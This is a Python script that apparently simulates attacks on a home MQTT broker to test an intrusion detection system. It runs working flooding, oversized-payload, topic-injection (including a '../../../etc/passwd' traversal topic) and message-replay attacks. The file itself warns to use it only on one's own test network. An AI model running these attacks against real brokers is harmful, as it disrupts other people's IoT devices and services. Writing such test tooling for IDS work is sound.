#!/usr/bin/env python3
"""
MQTT Attack Simulator - Malicious Node

This script simulates various MQTT-based attacks for testing the IDS:
- Flooding attack (high packet rate)
- Large payload attack
- Topic injection attack

WARNING: Only use this on YOUR OWN test network!

Usage:
    python3 attack_simulator.py --attack flood --duration 60
"""

import paho.mqtt.client as mqtt
import time
import random
import string
import argparse
from datetime import datetime

# MQTT Configuration
MQTT_BROKER = "raspberrypi.local"  # or IP address
MQTT_PORT = 1883
MQTT_CLIENT_ID = "MALICIOUS_NODE_001"

class AttackSimulator:
    def __init__(self, broker, port):
        self.broker = broker
        self.port = port
        self.client = mqtt.Client(MQTT_CLIENT_ID)
        self.attack_count = 0
        
    def connect(self):
        """Connect to MQTT broker"""
        try:
            print(f"[*] Connecting to broker: {self.broker}:{self.port}")
            self.client.connect(self.broker, self.port, 60)
            self.client.loop_start()
            print(f"[✓] Connected as: {MQTT_CLIENT_ID}")
            return True
        except Exception as e:
            print(f"[✗] Connection failed: {e}")
            return False
    
    def disconnect(self):
        """Disconnect from broker"""
        self.client.loop_stop()
        self.client.disconnect()
        print(f"\n[*] Disconnected. Total attacks sent: {self.attack_count}")
    
    def flooding_attack(self, duration=60, rate=100):
        """
        Flooding Attack: Send messages at very high rate
        
        Args:
            duration: Duration of attack in seconds
            rate: Messages per second
        """
        print(f"\n[🚨 ATTACK] Flooding - {rate} msg/sec for {duration}s")
        print("="*60)
        
        topic = "home/sensor/data"
        start_time = time.time()
        
        while (time.time() - start_time) < duration:
            # Create payload
            payload = f'{{"temp":25.0,"hum":60.0,"id":"{MQTT_CLIENT_ID}","attack":"flood"}}'
            
            # Publish
            self.client.publish(topic, payload)
            self.attack_count += 1
            
            if self.attack_count % 100 == 0:
                print(f"[{self.attack_count}] Flooding... Rate: {rate}/s")
            
            # Sleep to maintain rate
            time.sleep(1.0 / rate)
        
        print(f"[✓] Flooding attack complete. Sent {self.attack_count} messages")
    
    def large_payload_attack(self, duration=60, size_kb=10):
        """
        Large Payload Attack: Send oversized messages
        
        Args:
            duration: Duration of attack in seconds
            size_kb: Payload size in kilobytes
        """
        print(f"\n[🚨 ATTACK] Large Payload - {size_kb}KB messages for {duration}s")
        print("="*60)
        
        topic = "home/sensor/data"
        # Generate large payload
        large_data = ''.join(random.choices(string.ascii_letters + string.digits, k=size_kb*1024))
        payload = f'{{"data":"{large_data}","attack":"large_payload"}}'
        
        start_time = time.time()
        
        while (time.time() - start_time) < duration:
            self.client.publish(topic, payload)
            self.attack_count += 1
            print(f"[{self.attack_count}] Sending {len(payload)/1024:.1f}KB payload...")
            time.sleep(2)  # Send every 2 seconds
        
        print(f"[✓] Large payload attack complete. Sent {self.attack_count} messages")
    
    def topic_injection_attack(self, duration=60):
        """
        Topic Injection Attack: Publish to random/unauthorized topics
        
        Args:
            duration: Duration of attack in seconds
        """
        print(f"\n[🚨 ATTACK] Topic Injection for {duration}s")
        print("="*60)
        
        start_time = time.time()
        
        malicious_topics = [
            "admin/config",
            "system/shutdown",
            "../../../etc/passwd",
            "home/sensor/../admin",
            "$SYS/broker/clients",
        ]
        
        while (time.time() - start_time) < duration:
            # Random malicious topic
            topic = random.choice(malicious_topics)
            payload = f'{{"attack":"topic_injection","target":"{topic}"}}'
            
            self.client.publish(topic, payload)
            self.attack_count += 1
            print(f"[{self.attack_count}] Injecting to: {topic}")
            time.sleep(1)
        
        print(f"[✓] Topic injection attack complete. Sent {self.attack_count} messages")
    
    def replay_attack(self, duration=60):
        """
        Replay Attack: Capture and replay old messages rapidly
        
        Args:
            duration: Duration of attack in seconds
        """
        print(f"\n[🚨 ATTACK] Replay Attack for {duration}s")
        print("="*60)
        
        # Simulate captured old message
        old_message = '{"temp":24.5,"hum":55.0,"id":"ESP32_Sensor_001","timestamp":"2024-01-01 00:00:00"}'
        topic = "home/sensor/data"
        
        start_time = time.time()
        
        while (time.time() - start_time) < duration:
            # Replay old message 10 times/sec
            for _ in range(10):
                self.client.publish(topic, old_message)
                self.attack_count += 1
            
            if self.attack_count % 100 == 0:
                print(f"[{self.attack_count}] Replaying old messages...")
            
            time.sleep(1)
        
        print(f"[✓] Replay attack complete. Sent {self.attack_count} messages")

def main():
    parser = argparse.ArgumentParser(description='MQTT Attack Simulator')
    parser.add_argument('--broker', type=str, default=MQTT_BROKER,
                       help='MQTT broker address')
    parser.add_argument('--port', type=int, default=MQTT_PORT,
                       help='MQTT broker port')
    parser.add_argument('--attack', type=str, required=True,
                       choices=['flood', 'large_payload', 'topic_injection', 'replay'],
                       help='Type of attack to simulate')
    parser.add_argument('--duration', type=int, default=60,
                       help='Duration of attack in seconds')
    parser.add_argument('--rate', type=int, default=100,
                       help='Message rate for flooding attack (msgs/sec)')
    parser.add_argument('--size', type=int, default=10,
                       help='Payload size for large_payload attack (KB)')
    
    args = parser.parse_args()
    
    print("\n" + "="*60)
    print("  ⚠️  MQTT ATTACK SIMULATOR  ⚠️")
    print("="*60)
    print("\n⚠️  WARNING: Use only on YOUR OWN test network!")
    print("⚠️  This will trigger IDS alerts and IP blocking!\n")
    
    # Create attack simulator
    simulator = AttackSimulator(args.broker, args.port)
    
    if not simulator.connect():
        return
    
    time.sleep(1)  # Wait for connection to stabilize
    
    try:
        # Execute attack
        if args.attack == 'flood':
            simulator.flooding_attack(args.duration, args.rate)
        elif args.attack == 'large_payload':
            simulator.large_payload_attack(args.duration, args.size)
        elif args.attack == 'topic_injection':
            simulator.topic_injection_attack(args.duration)
        elif args.attack == 'replay':
            simulator.replay_attack(args.duration)
    
    except KeyboardInterrupt:
        print("\n[*] Attack interrupted by user")
    finally:
        simulator.disconnect()

if __name__ == "__main__":
    main()
